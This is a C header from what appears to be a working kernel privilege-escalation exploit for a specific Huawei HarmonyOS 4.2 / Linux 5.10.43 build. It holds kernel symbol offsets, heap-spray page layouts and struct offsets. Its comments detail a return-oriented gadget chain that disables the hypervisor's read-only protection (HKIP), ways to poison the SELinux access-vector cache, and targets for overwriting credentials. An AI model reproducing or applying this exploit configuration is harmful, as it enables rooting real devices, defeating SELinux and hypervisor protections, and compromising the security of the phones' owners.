#ifndef TARGET_H
#define TARGET_H

/*
 * Target: HarmonyOS 4.2 / Linux 5.10.43 (HWWLZ).
 * Default VA↔page uses the device physical PFN (memstart_addr).
 * QEMU copy_page_to_iter wrap is compiled in only with QEMU=1.
 *
 * Offsets below are taken from this tree's emulation/vmlinux, not from
 * the Android 17 / 6.1+ writeup.  CONFIGFS_READ_ITER and
 * CONFIGFS_BIN_WRITE_ITER keep the official names so shared exploit
 * sources compile.  S22U / A536E / NOH 5.10 WPs all still plant
 * configfs_read_file.cfi_jt and configfs_write_bin_file.cfi_jt in
 * ashmem .read/.write; configfs_write_file is not a drop-in (it
 * copy_from_user's into buffer->page then calls attr->store).
 * This vmlinux: page +16, needs_read_fill +64, bin_buffer +72,
 * bin_buffer_size +80 (ldrsw), cb_max_size +84.  write_bin vfreed
 * the overlay dest whenever *ppos+count > bin_buffer_size.
 */

#define BUILD_VARIANT_LABEL "huawei_wlz_5_10_43"
#ifdef QEMU_LAYOUT
#define BUILD_FINGERPRINT "HUAWEI/WLZ/HWWLZ:12/HUAWEIWLZ/qemu:user/release-keys"
#else
#define BUILD_FINGERPRINT "HUAWEI/WLZ/HWWLZ:12/HUAWEIWLZ:user/release-keys"
#endif

#define CONFIGFS_USE_FILE_RW 1
#define PSELECT_WAITER_LAYOUT_5_10 1
/*
 * 5.10 unix_stream_sendmsg uses alloc_skb_with_frags(header_len=0xe80).
 * Send bytes [0,0xe80) stay in the skb head; [0xe80,) land on the
 * reclaimed order-3 page at offset 0.  Keep fake_* at page+LOCK/W0/FOPS
 * and write those fields at skb_buf+0xe80 so wait_lock is actually 0.
 */
#define SKB_DATA_DELTA 0
#define SKB_FRAG_BIAS 0xe80
/*
 * unix_stream_sendmsg caps at 0x8e80: 0xe80 linear head + one order-3
 * frag.  Plant once at skb_buf+0xe80 so LOCK/W0/FOPS sit on that frag.
 */
#define SKB_SEND_SIZE (0xe80 + ORDER3_SIZE)
#define SKB_RECLAIM_SENDS 24
#define SKB_RECLAIM_PAIRS 8

#define KIMAGE_TEXT_BASE 0xffffffc010000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
/*
 * Device: pfn = ((va - PAGE_OFFSET) + memstart_addr) >> 12
 * with memstart_addr = P0_PHYS_OFFSET.  QEMU wrap omits memstart and
 * is selected only when building with QEMU=1 / QEMU_LAYOUT.
 * See docs/EMULATION_NOTES.md.
 */
/*
 * DO NOT "fix" this to the arm64 compile-time value 0xfffffffe00000000.
 *
 * pipe.c:392 uses qemu_wrap_linear_to_page():
 *   pfn  = (va - DIRECT_MAP_BASE) >> 12          <- deliberately no memstart
 *   page = VMEMMAP_START + pfn * 0x40
 * while the kernel's real mapping is
 *   pfn  = (va - PAGE_OFFSET + memstart) >> 12   <- with memstart
 * so this constant must be the real vmemmap base PLUS (memstart>>12)*0x40,
 * which makes the two formulas agree.  IonStack-S22U documents exactly this
 * (MEMORY.md 4c: their target.h value is "+0x2000000 too high" against the
 * true base at memstart=0x80000000, and pipe.c's missing memstart cancels
 * it).  Here memstart = 0x40000000, i.e. a 0x01000000 allowance.
 * Replacing it with 0xfffffffe00000000 breaks that cancellation and every
 * struct page pointer comes out wrong.
 */
#define VMEMMAP_START 0xfffffffeffe00000ULL
#ifdef QEMU_LAYOUT
#define TARGET_PAGE_DIRECT_BASE 0xffffffc008000000ULL
#endif

#define MM_STRUCT_SZ 0x3c0
#define MM_ORDER 3
#define MM_CPU_PARTIAL 13
#define KSNITCH_COLLISIONS 6

#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_PIPE_INDEX 9
#define KMALLOC_CACHE_TYPES 3
#define KMALLOC_PIPE_OBJ_SIZE 0xa0

#define ASHMEM_MISC_FOPS_OFF 0x03B97708ULL
#define ASHMEM_FOPS_OFF 0x030FFFF0ULL
#define ASHMEM_IOCTL_OFF 0x0262925CULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x02629260ULL
#define ASHMEM_MMAP_OFF 0x02623254ULL
#define ASHMEM_OPEN_OFF 0x02629B60ULL
#define ASHMEM_RELEASE_OFF 0x02629B64ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x02613158ULL
#define CONFIGFS_READ_ITER_OFF 0x02621BD0ULL /* configfs_read_file.cfi_jt */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x02625878ULL /* configfs_write_bin_file.cfi_jt */
/* configfs_write_file: dst = buffer->page (asma+0x10), no bin_buffer needed.
 *   ldr x24,[x27,#0x10]; count=min(count,0xfff); memset(page,0,count);
 *   copy_from_user(page, buf, count); page[count]=0 */
#define CONFIGFS_WRITE_FILE_ITER_OFF 0x02625874ULL /* configfs_write_file.cfi_jt */
#define CONFIGFS_WRITE_FILE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_FILE_ITER_OFF)
#define COPY_SPLICE_READ_OFF 0x004d9358ULL
#define NOOP_LLSEEK_OFF 0x00474DCCULL
#define INIT_TASK_OFF 0x036F4980ULL
/* Statically known zero page: the fake rt_mutex for the walk lives in one
 * 0x20 slot of it (HUAWEI GOT-W29: SLIDE_LOCK_STRIDE/SLOTS), so the walk
 * needs no reclaimed page at all. */
#define EMPTY_ZERO_PAGE_OFF 0x03D27000ULL
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
/* __schedule: prologue does `mrs x26, sp_el0`, so x26 == current inside it. */
#define SCHEDULE_OFF 0x028000B0ULL
#define SCHEDULE_SIZE 0x00000DF4ULL
#define ROOT_TASK_GROUP_OFF 0x03D2D780ULL
#define SELINUX_BLOB_SIZES_OFF 0x02821088ULL
#define SELINUX_ENFORCING_OFF 0x03EBB068ULL /* selinux_state; no enforcing field */
/*
 * SELinux data-only bypass (dawnslab: security_compute_av -> unmap_class ->
 * allow_unknown), offsets verified by disassembling THIS image:
 *   security_compute_av @ 0xffffffc0109da654, x21 = *(selinux_state+0x50)
 *   9da94c  ldrh w9,[x21,#0x268]      ; policy->map.size   (u16)
 *   9da968  ldr  x8,[x21,#0x260]      ; policy->map.mapping (ptr)
 *   9da974  mov  w10,#0x88            ; sizeof(selinux_mapping)
 *   9da97c  ldrh w3,[x8,tclass*0x88]  ; unmap_class -> .value
 *   9da98c  b.eq <allow_unknown check> when that value is 0
 *   9dabe4  ldrb w8,[x21,#0x254]
 *   9dabe8  tbnz w8,#1 -> avd->allowed = 0xffffffff
 * Do NOT touch selinux_state+8: that pointer is validated right above and a
 * failure prints "Attempt to alter selinux_prot!" then executes brk #0x800.
 */
#define SELINUX_POLICY_OFF 0x50 /* selinux_state.policy */
#define SELINUX_POLICY_ALLOW_UNKNOWN_OFF 0x254
#define SELINUX_POLICY_MAP_MAPPING_OFF 0x260
#define SELINUX_POLICY_MAP_SIZE_OFF 0x268
#define SELINUX_ALLOW_UNKNOWN_BIT 0x02
/*
 * Kernel page-table root and MMU base, for translating a vmalloc VA to a
 * linear-map VA (the pipe primitive can only address the direct map, and the
 * configfs primitive is blocked by __check_object_size).  Both are image
 * symbols, so their linear aliases are pipe-readable.
 *   swapper_pg_dir 0xffffffc013303000  memstart_addr 0xffffffc012820378
 * VA_BITS=39 with 4K pages gives 3 levels: PGD >>30, PMD >>21, PTE >>12.
 */
#define SWAPPER_PG_DIR_OFF 0x03303000ULL
#define MEMSTART_ADDR_OFF 0x02820378ULL
#define VABITS_ACTUAL_OFF 0x03D26010ULL /* u64, VA_BITS at runtime */
#define VABITS_ACTUAL (KIMAGE_TEXT_BASE + VABITS_ACTUAL_OFF)
#define SWAPPER_PG_DIR (KIMAGE_TEXT_BASE + SWAPPER_PG_DIR_OFF)
#define MEMSTART_ADDR (KIMAGE_TEXT_BASE + MEMSTART_ADDR_OFF)
/* HKIP PRMEM: SELinux pool. Selinux policy objects are allocated from it with
 * pmalloc() and protected read-only at EL2 (CONFIG_HKIP_SELINUX_PROT=y), so
 * data-only writes cannot change policy.  pool->pmalloc_list at +0x8; each
 * vmap_area_node: next +0x8, va_start +0x10, va_size +0x18; unregistering
 * needs 4K-aligned (va_start, va_size) passed to hkip_unregister_ro_mod. */
/*
 * prmem pools all live in one linker section, and two of them are SELinux's:
 *   selinux_prot_pool 0xffffffc0136d0000  <- this one (aka __start_data_prmem_pools)
 *   selinux_pool      0xffffffc0136d01a0
 *   __end_data_prmem_pools 0xffffffc0136d0208
 * Measured on device:
 *   selinux_prot_pool -> pmalloc_list holds ONE 4K node at 0xfffffffe87ff0000,
 *                        the writable twin page that contains selinux_state (and
 *                        therefore the HKIP gate byte at selinux_state+8);
 *   selinux_pool      -> pmalloc_list holds many 4K nodes (0xfffffffeb05xxxxx),
 *                        none of which covers the policy buffer.
 * We target selinux_prot_pool because the HKIP decision byte lives in its node.
 */
#define SELINUX_SEL_POOL_OFF 0x036D01A0ULL
#define SELINUX_SEL_POOL (KIMAGE_TEXT_BASE + SELINUX_SEL_POOL_OFF) /* selinux_pool: ro_recl (register_ro_mod) */
#define HKIP_HVC_RO_MOD_UNREGISTER 0xC6001033ULL /* hkip_unregister_ro_mod */
#define SET_MEMORY_RW_OFF 0x000B02CCULL /* set_memory_rw(addr, numpages) */
#define SELINUX_PROT_POOL_OFF 0x036D0000ULL
#define SELINUX_PROT_POOL (KIMAGE_TEXT_BASE + SELINUX_PROT_POOL_OFF)
#define PRMEM_POOL_LIST_OFF 0x8
#define PRMEM_NODE_NEXT_OFF 0x8
#define PRMEM_NODE_START_OFF 0x10
#define PRMEM_NODE_SIZE_OFF 0x18
/* Bounded pmalloc_list walk: enough for any realistic pool, small enough that a
 * mis-parsed next pointer cannot keep us dereferencing forever. */
#define PRMEM_MAX_NODES 64
#define HKIP_UNREGISTER_RO_MOD_OFF 0x022085B0ULL
#define HKIP_UNREGISTER_RO_MOD (KIMAGE_TEXT_BASE + HKIP_UNREGISTER_RO_MOD_OFF)
/*
 * Route C: make the kernel call hkip_unregister_ro_mod(va_start, va_size) so the
 * EL2-side RO protection on the SELinux pool is lifted by the HVC that function
 * issues itself.  Full derivation: HVC_ROP_CHAIN.md.
 *
 * Control-flow entry -- cpu_switch_to restores a sleeping task's
 * thread.cpu_context, so overwriting it hands us x19-x28, x29, sp and x30:
 *   cpu_switch_to @ 0xffffffc010003cc0
 *     mov x10,#0xb50 ; add x8,x0,x10
 *     stp x19,x20,[x8],#0x10 ... stp x29,x9,[x8],#0x10 ; str x30,[x8]
 *     mov sp,x9 ; ret
 */
#define TASK_CPU_CONTEXT_OFF 0xb50
#define CPU_CTX_X19_OFF 0x00
#define CPU_CTX_X22_OFF 0x18
#define CPU_CTX_X25_OFF 0x30
#define CPU_CTX_X29_OFF 0x50
#define CPU_CTX_SP_OFF 0x58
#define CPU_CTX_X30_OFF 0x60
/*
 * Argument-loading + call gadget (mid-function entry, menu_select tail):
 *   ldp x1,x2,[sp,#0x10] ; mov x0,x19 ; ... ; blr x25
 * its post-call tail, verified instruction by instruction:
 *   ldr w8,[sp,#0x30] ; cbz w8,<elsewhere>
 *   ldr w0,[x22]                        ; x22 must be readable
 *   ldur x8,[x29,#-0x8] ; cmp with __stack_chk_guard ; b.ne __stack_chk_fail
 *   ldp x29,x30,[sp,#0x60] ; add sp,sp,#0xc0 ; ret
 * so x29 must point 8 bytes past the real guard value.
 */
#define HVC_CHAIN_GADGET_OFF 0x0119a704ULL
/*
 * Route C termination, derived entirely from the image (see HVC_ROP_CHAIN.md).
 *
 * `bl __switch_to` has exactly one call site, __schedule+0x904 at
 * 0xffffffc0128009b4, and the very next instruction is `bl finish_task_switch`
 * with x0 passed straight through.  __switch_to feeds that x0 by doing
 * `mov x0, x20` (prev) right before `bl cpu_switch_to`, and cpu_switch_to never
 * touches x0 -- that is how `last` is returned.  So a hijacked resume must
 * satisfy three things at once: sp == the original cpu_context.sp, x30 == the
 * instruction after `bl cpu_switch_to`, and x0 == prev.
 *
 * __switch_to (0xffffffc01008d818, 0x21c bytes, no locals, no canary) frame:
 *   [orig_sp+0x00] saved x29      [orig_sp+0x08] saved x30 = 0xffffffc0128009b8
 *   [orig_sp+0x10] saved x21      [orig_sp+0x18] saved x22
 *   [orig_sp+0x20] saved x19      [orig_sp+0x28] saved x20
 * and its epilogue is
 *   0x8da28 ldp x20,x19,[sp,#0x20] ; 0x8da2c ldp x22,x21,[sp,#0x10]
 *   0x8da30 ldp x29,x30,[sp],#0x30 ; 0x8da34 ret
 * Note it restores x19..x22 only: x23..x28 arrive straight from cpu_switch_to,
 * so the chain must put the victim's ORIGINAL x23..x28 back itself.
 *
 * The chain therefore lives in [orig_sp-0x150, orig_sp) on the victim's own
 * kernel stack, entirely below its live frame.  That is reachable with the
 * existing pipe writer because CONFIG_VMAP_STACK is off: kernel_fork.c does
 * `tsk->stack = page_address(page)`, a linear-map address, i.e. exactly the
 * address class pipe_phys_write_data() already converts.
 *
 *   base = orig_sp - 0x150                       entry gadget frame
 *   base+0x000 -> x29 for the call gadget        base+0x008 -> x30 (call gadget)
 *   base+0x010 -> x19 (va_start, loaded by the entry gadget)
 *   base+0x020 = menu_select frame (0xc0)        exits with sp = base+0xe0
 *   base+0x0e0 = final gadget frame (0x70)       exits with sp = orig_sp
 *
 * Entry gadget 0xffffffc0102bea48 (trace_event_buffer_reserve+0xc8) saves the
 * incoming x0 == prev into [x19+0x18], then loads x19/x29/x30 from the stack:
 *   str x0,[x19,#0x18] ; ldr x19,[sp,#0x10] ; ldp x29,x30,[sp],#0x20 ; ret
 * Final gadget 0xffffffc0101cd38c (probe_irq_on+0x8c0) reloads x0 == prev plus
 * x19..x28 and x29/x30, then restores sp exactly:
 *   ldr x0,[sp,#0x8] ; ldp x20,x19,[sp,#0x60] ; ldp x22,x21,[sp,#0x50]
 *   ldp x24,x23,[sp,#0x40] ; ldp x26,x25,[sp,#0x30] ; ldp x28,x27,[sp,#0x20]
 *   ldp x29,x30,[sp,#0x10] ; add sp,sp,#0x70 ; ret
 */
#define HVC_HVC0_GADGET_OFF 0x0003de8ULL /* __hyp_set_vectors+8: hvc #0 ; ret */
#define HKIP_HVC_ROWM_REGISTER 0xC6001040ULL /* hkip_register_rowm(base,size) */
#define HKIP_HVC_ROWM_WRITE_8 0xC6001054ULL /* hkip_write_rowm_8(dst,val) */
#define HKIP_HVC_ROWM_CLEAR_8 0xC600105AULL /* hkip_hvc2(CLEAR_8, dst) */
#define HVC_ENTRY_STORE_GADGET_OFF 0x02bea48ULL /* trace_event_buffer_reserve+0xc8 */
#define HVC_FINAL_GADGET_OFF 0x01cd38cULL       /* probe_irq_on+0x8c0 */
#define SWITCH_RESUME_OFF 0x0008da28ULL   /* __switch_to, after bl cpu_switch_to */
#define SCHED_FINISH_TS_OFF 0x028009b8ULL /* __schedule+0x908, bl finish_task_switch */
#define HVC_STACK_FRAME_SIZE 0x150ULL
#define HVC_STACK_MS_OFF 0x20ULL   /* menu_select frame base, from chain base */
#define HVC_STACK_FINAL_OFF 0xe0ULL /* final gadget frame base */
#define HVC_STACK_STORE_OFF 0xe8ULL /* where the entry gadget parks prev (x0) */
#define HVC_STACK_STORE_BASE 0xd0ULL /* ...via str x0,[x19,#0x18], x19 = base+0xd0 */
/* Slot arithmetic is load-bearing; lock it against future edits. */
_Static_assert(HVC_STACK_MS_OFF + 0xc0 == HVC_STACK_FINAL_OFF,
               "menu_select's add sp,#0xc0 must land on the final frame");
_Static_assert(HVC_STACK_STORE_BASE + 0x18 == HVC_STACK_STORE_OFF,
               "entry gadget str x0,[x19,#0x18] must hit the final x0 slot");
_Static_assert(HVC_STACK_FINAL_OFF + 0x08 == HVC_STACK_STORE_OFF,
               "final gadget loads x0 from frame+0x08");
_Static_assert(HVC_STACK_FINAL_OFF + 0x70 == HVC_STACK_FRAME_SIZE,
               "final gadget's add sp,#0x70 must reach orig_sp exactly");
_Static_assert(HVC_STACK_MS_OFF + 0x10 + 0x08 == HVC_STACK_MS_OFF + 0x18,
               "canary slot is [x29-8] with x29 = ms+0x10");
#define FINISH_RET_TO_USER_OFF 0x000038c8ULL
/*
 * The chain must NOT return the victim to user mode: finish_ret_to_user would
 * eret using our fabricated pt_regs and, worse, the victim would later be
 * scheduled again carrying sp = our chain page, which corrupts unrelated kernel
 * state (measured: collateral "futex_wake" NULL+0xbf0 crash in tencent.mm:push).
 * do_exit() instead tears the victim down inside the kernel and it is never
 * resumed, so its overwritten cpu_context becomes irrelevant.
 */
#define DO_EXIT_OFF 0x000ccd4cULL
#define STACK_CHK_GUARD_OFF 0x036e2d48ULL
/* Scratch inside our own planted order-3 page (0x8000); 0x0000..0x5600 is
 * already used by the payload / fake_task / left / right blocks. */
#define HVC_CHAIN_OFF 0x6000
#define HVC_RO_PTR_OFF 0x7400
/* SELinux AVC poisoning (TASZK, Mate 40: "rewrote the AVC cache so the
 * decisions will allow anything to anybody -- this is not protected memory").
 * avc_node objects are plain kmalloc and NOT in the EL2-protected policy pool,
 * so a data-only write is enough.
 *
 * Layout on THIS image (vmlinux_nop_2026.elf), verified at two call sites:
 *
 *   avc_lookup @ 0xffffffc0109bdff8
 *     eor w10,w1,w2,lsl#2 ; eor w10,w10,w3,lsl#4 ; and w10,w10,#0x1ff
 *     ldar x10,[avc+0x8+hash*8]  ->  sub x0,x10,#0x28   == node
 *     ldr w10,[x0]      ; ssid    @ node+0x00
 *     ldr w10,[x0,#0x4] ; tsid    @ node+0x04
 *     ldrh w10,[x0,#0x8]; tclass  @ node+0x08
 *     add x10,x0,#0x28  ; list.next == *(entry)
 *
 *   avc_has_perm @ 0xffffffc0109bf778
 *     9bf7ec ldur x10,[x0,#0x0c] ; 9bf7e8 ldur x9,[x0,#0x14]
 *     9bf7f4 stp  x10,x9,[sp,#0x8]      ; rebuilds struct av_decision at sp+8
 *     9bf7f8 ldr  w8,[sp,#0x8]          ; avd->allowed   == node+0x0c
 *     9bf7fc bics wzr,w19,w8            ; the actual allow/deny decision
 *     9bf824 ldr  w8,[sp,#0xc]          ; auditallow     == node+0x10
 *     9bf874 ldr  w8,[sp,#0x10]         ; auditdeny      == node+0x14
 *
 *   avc_compute_av @ 0xffffffc0109be224 (cross-check)
 *     9be298 ldr w24,[x25,#0xc]         ; x25 = avd -> reads avd+0x0c
 *     9be304 ldr w2,[x19,#0x1810]       ; state->avc -> avc_cache.latest_notif
 *     9be308 cmp w2,w24                 ; policy-seqno comparison
 *     => the word at node+0x18 is avd.seqno, NOT allowed.
 *
 * HISTORY / DO NOT REGRESS: the earlier value 0x1c was avd.seqno (and 0x24 was
 * avd.flags).  node is already list-corrected by -0x28, so writing at +0x1c
 * landed 0x0c bytes BEFORE the object and check_heap_object rejected it --
 * that, not the mechanism, is why the AVC writes never stuck.
 */
#define SELINUX_STATE_AVC_OFF 0x48
/*
 * The AVC itself is a STATIC object in the kernel image, not kmalloc:
 *   avc_compute_av @ 0xffffffc0109be294:  ldr x19,[x19,#0x48]      ; state->avc
 *   avc_compute_av @ 0xffffffc0109be304:  ldr w2,[x19,#0x1810]     ; latest_notif
 *   avc_compute_av @ 0xffffffc0109be2d8:  adrp x10,0xffffffc013ebb000 <selinux_avc+0x17e0>
 * so selinux_avc = 0xffffffc013ebb000 - 0x17e0 = 0xffffffc013eb9820, i.e.
 * KIMAGE_TEXT_BASE + 0x03EB9820.  Measured (g9): state->avc does not pass
 * lin_ok(), which is why the first avc_allow() run reported nodes=0 -- the
 * slots live in the *image* window while the nodes live in the linear map.
 */
#define SELINUX_AVC_OFF 0x03EB9820ULL
#define SELINUX_AVC (KIMAGE_TEXT_BASE + SELINUX_AVC_OFF)
#define AVC_CACHE_SLOTS 512
#define AVC_SLOTS_OFF 0x8
/*
 * struct selinux_avc { u32 avc_cache_threshold; struct avc_cache avc_cache; }
 * so avc_cache starts at avc+0x8 and, with slots[512] (0x1000) followed by
 * slots_lock[512] (0x800), the tail fields are:
 *   avc+0x1808 lru_hint      avc+0x180c active_nodes   avc+0x1810 latest_notif
 * (0x1810 is confirmed by avc_compute_av @ 0xffffffc0109be224: `ldr w2,[x19,#0x1810]`
 *  with x19 = state->avc, compared against the decision's seqno).
 * avc_cache_threshold sits at avc+0x0.  Raising it disables node reclaim, which
 * is what keeps a poisoned tuple in the cache until the access actually
 * happens; measured without it the population churned 283..291 across six
 * poison rounds and the target tuple was gone by test time.
 */
#define AVC_CACHE_THRESHOLD_OFF 0x0
#define AVC_CACHE_ACTIVE_NODES_OFF 0x180c
#define AVC_CACHE_LATEST_NOTIF_OFF 0x1810
#define AVC_NODE_SSID_OFF 0x00
#define AVC_NODE_TSID_OFF 0x04
#define AVC_NODE_TCLASS_OFF 0x08
#define AVC_NODE_ALLOWED_OFF 0x0c
#define AVC_NODE_AUDITALLOW_OFF 0x10
#define AVC_NODE_AUDITDENY_OFF 0x14
#define AVC_NODE_SEQNO_OFF 0x18
#define AVC_NODE_FLAGS_OFF 0x1c
#define AVC_NODE_LIST_OFF 0x28 /* slot holds &node->list, so node = entry - 0x28 */
#define AVC_NODE_NEXT_OFF 0x0
#define SECURITY_HOOK_HEADS_OFF 0x028209F8ULL
#define KMALLOC_CACHES_OFF 0x028204D0ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0305FE88ULL
#define MODPROBE_PATH_OFF 0x036D0388ULL
#define PIPE_MAX_SIZE_OFF 0x03ABC5A8ULL
#define PIPE_USER_PAGES_SOFT_OFF 0x03ABC5A0ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
/*
 * HKIP's own bookkeeping of which pids may hold uid 0 / gid 0, found by
 * disassembling hkip_check_xid_root: byte = pid>>3, bit = pid&7, pids >= 0x8000
 * bypass the lookup.  Offsets are init_task-relative in the same kallsyms
 * image (hkip_uid_root_bits - init_task = 0xC7B680; gid is +0x1000).
 */
#define HKIP_UID_ROOT_BITS_OFF 0x04370000ULL
#define HKIP_GID_ROOT_BITS_OFF 0x04371000ULL
#define HKIP_UID_ROOT_BITS (KIMAGE_TEXT_BASE + HKIP_UID_ROOT_BITS_OFF)
#define HKIP_GID_ROOT_BITS (KIMAGE_TEXT_BASE + HKIP_GID_ROOT_BITS_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
/*
 * # CONFIG_SECURITY_SELINUX_DEVELOP is not set.
 * get_selinux_enforcing is `mov w0,#1; ret`.  SELINUX_ENFORCING is
 * selinux_state; +0 is checkreqprot (already 0).  Writing it does
 * not drop Enforcing.  Dawnslab allow_unknown / class-map writes
 * hit HKIP-RO policy pages (pstore: write to read-only memory).
 */
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define MODPROBE_PATH (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
#define PIPE_MAX_SIZE (KIMAGE_TEXT_BASE + PIPE_MAX_SIZE_OFF)
#define PIPE_USER_PAGES_SOFT (KIMAGE_TEXT_BASE + PIPE_USER_PAGES_SOFT_OFF)

#define SLIDE_NFULNL_LOGGER_OFF 0x036E8A60ULL
#define SLIDE_LOGGERS_0_1_OFF 0x036E8998ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x03EEAC44ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x03EEAC44ULL

#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Tracefs KASLR: uid 2000 can enable sched_blocked_reason and read
 * per-cpu trace_pipe_raw.  Huawei format adds funname/offset/size;
 * event id 60 from this guest.  worker_thread bl schedule return is
 * worker_thread+0x590 = KIMAGE+_text+0x102e40. */
#define SLIDE_TRACEFS_EVENT_ID 60
#define SLIDE_TRACEFS_WORKER_OFF 0x590ULL
#define SLIDE_TRACEFS_WORKER_SIZE 0x960ULL
#define SLIDE_TRACEFS_WORKER_LINK (KIMAGE_TEXT_BASE + 0x001050e4ULL) /* PATCH(nop): worker_thread 入口 */

#define LOCK_OFF 0x1350
#define LOCK2_OFF 0x1400
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
/* Upstream value (identical to huawei_wlz_5_10_43, the nova6 5.10 target
 * this port is derived from) -- do NOT move it.  A 0x5800 variant was tried
 * and withdrawn: it assumed the 512-slot pipe ring overwrites page offset
 * 0x90..0x5090, but pipe.c only ever writes PIPE_RECLAIM (240) slot
 * descriptors, ending at 0x90 + 240*0x28 = 0x2610, and the successful run's
 * post-ring configfs writes through fake_fops (page offset 0x1000) prove the
 * planted page is not bulk-zeroed.  Crash mode A is a whole-page reuse
 * failure, so relocating fake_task inside the page cannot fix it. */
#define FAKE_TASK_OFF 0x3200

#define WAITER_LOCAL_OFF 0x50
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF 0x40
#define WAITER_PRIO_OFF 0x48
#define WAITER_DEADLINE_OFF 0x50
#define WAITER_WW_CTX_OFF 0x50

#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x124
#define FAKE_TASK_NORMAL_PRIO_OFF 0x12c
#define FAKE_TASK_TASK_GROUP_OFF 0x2c0
#define FAKE_TASK_PI_LOCK_OFF 0x8d4
#define FAKE_TASK_PI_WAITERS_OFF 0x8e8
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 64
#define CFG_BIN_BUFFER_OFF 72
#define CFG_BIN_BUFFER_SIZE_OFF 80
#define CFG_CB_MAX_SIZE_OFF 84

/* mm_update_next_owner() starts with `ldr x8,[x0,#0x330]; cmp x8,current`,
 * so mm->owner is at 0x330 (the old 1032/0x408 value was a different build). */
#define MM_OWNER_OFF 0x330
#define TASK_THREAD_PID_OFF 0x6a8
#define PID_NR_OFF 0x60
#define TASK_PID_OFF 0x6a8
#define TASK_TGID_OFF 0x6a8
#define TASK_REAL_PARENT_OFF 0x628
#define TASK_ATOMIC_FLAGS_OFF 0x5d8
#define TASK_REAL_CRED_OFF 0x7f8

#define TASK_CRED_OFF 0x800
#define TASK_COMM_OFF 0x810
